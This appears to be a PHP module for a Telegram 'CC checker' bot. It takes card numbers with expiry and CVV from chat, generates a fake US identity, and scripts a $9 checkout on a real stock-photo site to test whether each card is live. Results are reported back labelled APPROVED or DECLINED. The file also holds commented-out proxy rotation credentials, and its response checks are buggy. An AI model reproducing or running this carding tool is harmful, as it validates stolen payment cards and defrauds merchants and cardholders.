<?php

#----------------------------------------------------------------------#
#   GATE: UNKNOWN CHARGE 9$                                            #
#   SITE: https://www.canstockphoto.com/order/checkout/                #
#----------------------------------------------------------------------#

if ((strpos($message, "/unk") === 0) || (strpos($message, "!unk") === 0)){

  if (in_array($userId, $vip_users) === false){
    sendMessage($chatId,$vip_unauth_msg, $message_id);
    return;
    }

sendaction($chatId, "typing");
error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }




//================ [ INCLUDE FUNCTIONS ] ===============//
//include "./Tools/functions/usefun.php";
//include "./Tools/functions/flagsgen.php";



//================ [ EXPLODE & LISTA ] ===============//
$lista = substr($message, 4); 
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
  
$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1;   }
  
$lista = "$cc|$mes|$ano|$cvv";
  
  
//if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

if(strlen($mes) == 2){
	if ($mes<10) $mes = substr($mes, 1, 1);
	else $mes = $mes;	}
  
$str1 = substr($cc, 0, 1);
//========================//
	if ($str1 == "4") {
        $typc = "visa"; }
	elseif ($str1 == "5") {
        $typc = "mastercard"; }
	elseif ($str1 == "6") {
        $typc = "discovery"; }
	elseif ($str1 == "3") {
        $typc = "amex"; }
//========================//
  
  

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$type = $binna['type'];
$level = $binna['category'];
$country = $binna['country']['name'];
$emoji = $binna['country']['emoji'];
$bank = $binna['bank']['name'];
//$bank = getStr($bindata,'"bank": {"name": "', '"')));
curl_close($ch);

$bindata1 = " $bin - $brand - $type - $level - $bank - $country($emoji)";

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];
  
$rand = " $name - $last - $street - $city - $zip - $state - $email - $phone";
//echo $rand;
  
 /* 
//=================== [Proxys Section] ==================//
$Websharegay = rand(0,250);
$rp1 = array(
  	//1 => 'krmcyqke-rotate:9kanicwn8thd',
  	1 => 'lookdvnz-rotate:mms1x3cqscnm',
  	2 => 'gpwaqrjb-rotate:tv6dlsbhyywo',
  	3 => 'vhpfjxsx-rotate:xmzs8124xvqg',
  	4 => 'zhtwglvf-rotate:8okrq6e9k62o',
    ); 
    $rotate = $rp1[array_rand($rp1)];
////==============[Proxy Section]===============////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)) { $ip = "Live! ✅"; }
if (empty($ip1)) { $ip = "Dead! ❌"; }
*/
  
  
//=======================[1 REQ]=============================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.canstockphoto.com/plans-and-pricing/?credits');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.canstockphoto.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: none',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result1 = curl_exec($ch);
curl_close($ch);
  
$csrf1 = trim(strip_tags(getStr($result1, "name='csrfmiddlewaretoken' value='", "'")));



//=======================[2 REQ]============================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.canstockphoto.com/plans-and-pricing/?credits');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.canstockphoto.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
//'cookie: csrftoken=cVr3eggd5OIExnL0u81IeUIU0U3L8umguEQf5kXnNAZ1RkAkM44gHOgZIdKYuzMt; sessionid=dgnwye1un9fubkbxl5esi5su176yhwwx; _ga=GA1.2.790302576.1642371569; _gid=GA1.2.1819413615.1642371569; _gat=1',
'origin: https://www.canstockphoto.com',
'referer: https://www.canstockphoto.com/plans-and-pricing/?credits',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrfmiddlewaretoken='.$csrf1.'&product=40&credits=');
$result2 = curl_exec($ch);
curl_close($ch);

$csrf2 = trim(strip_tags(getStr($result2, "name='csrfmiddlewaretoken' value='", "'")));

  
//=======================[3 REQ]============================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.canstockphoto.com/order/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.canstockphoto.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
//'cookie: csrftoken=cVr3eggd5OIExnL0u81IeUIU0U3L8umguEQf5kXnNAZ1RkAkM44gHOgZIdKYuzMt; sessionid=dgnwye1un9fubkbxl5esi5su176yhwwx; _ga=GA1.2.790302576.1642371569; _gid=GA1.2.1819413615.1642371569; _gat=1',
'referer: https://www.canstockphoto.com/plans-and-pricing/?credits',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result3 = curl_exec($ch);
curl_close($ch);
  
$csrf3 = trim(strip_tags(getStr($result3, "name='csrfmiddlewaretoken' value='", "'")));

  
//=======================[4 REQ]============================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.canstockphoto.com/order/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.canstockphoto.com',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//'cookie: csrftoken=cVr3eggd5OIExnL0u81IeUIU0U3L8umguEQf5kXnNAZ1RkAkM44gHOgZIdKYuzMt; sessionid=dgnwye1un9fubkbxl5esi5su176yhwwx; _ga=GA1.2.790302576.1642371569; _gid=GA1.2.1819413615.1642371569; _gat=1',
'origin: https://www.canstockphoto.com',
'referer: https://www.canstockphoto.com/order/checkout/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
'x-requested-with: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrfmiddlewaretoken='.$csrf3.'&username='.$name.'2'.rand(11111,99999).'&password=Kvin'.rand(1111,9999).'&agree=on&name='.$name.'+'.$last.'&country=US&zip='.$zip.'&state='.$state.'&city='.urlencode($city).'&address='.urlencode($street).'&email='.$name.'1'.rand(11,99).'%40gmail.com&phone=917445'.rand(1111,9999).'&vat_number=&company='.$name.'&type='.$typc.'&'.$typc.'-account='.$cc.'&'.$typc.'-expiration_month='.$mes.'&'.$typc.'-expiration_year='.$ano.'&'.$typc.'-cvv='.$cvv.'');
$result4 = curl_exec($ch);
curl_close($ch);

$msg = trim(strip_tags(getStr($result4,'"message": "','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);


  
  
//==================[Responses]======================//
  
if((strpos($result4, 'Success')) || (strpos($res3, "Successed")) || (strpos($res3, "success")) || (strpos($res3, "succeeded")) || (strpos($res3, "succeed"))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐂𝐡𝐚𝐫𝐠𝐞 ($𝟗) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$result4.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

elseif(strpos($result4,  'Your payment was declined by your financial institution')) {
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐂𝐡𝐚𝐫𝐠𝐞 ($𝟗) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$msg.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

else{
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐂𝐡𝐚𝐫𝐠𝐞 ($𝟗) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$result4.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}



curl_close($ch);
unlink("cookies.txt");
}

//====================[Stripe Inline Charge]=====================//

?>